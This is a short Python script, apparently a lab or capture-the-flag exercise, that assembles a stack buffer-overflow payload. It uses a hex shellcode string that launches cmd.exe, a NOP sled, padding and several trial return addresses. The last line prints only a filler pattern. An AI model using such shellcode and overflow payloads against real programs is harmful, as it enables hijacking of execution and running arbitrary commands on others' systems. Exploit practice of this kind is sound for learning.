
shellcode="\x8b\xec\x68\x65\x78\x65\x20\x68\x63\x6d\x64\x2e\x8d\x45\xf8\x50\xb8\x8D\x15\x86\x7C\xff\xd0"
nop="\x90\x90"
addr="\x12\x34\x56\x78"
buffLen=100
nbNop=40 
padding='\xFF'
#print(len(shellcode) + 40)
#print(f"{nop*nbNop}{shellcode}{padding*(buffLen-nbNop-len(shellcode))}{addr}")
#print(len(shellcode))  --> 23
# 146 - 23 = 123
# 123 - 10 = 113
#print(f"{nop*20}{shellcode}{'C'*83}\xb4\x19\x64\x01")
addr = "\x08\x04\x40\x70"
addr = "\x70\x40\x04\x08"
addr = "\xFF\xFF\xFF\xFF"
print("A"*50 + "D" * len(shellcode) + "C" * (146 - 50 - len(shellcode)) +addr)
#print(nop*40)


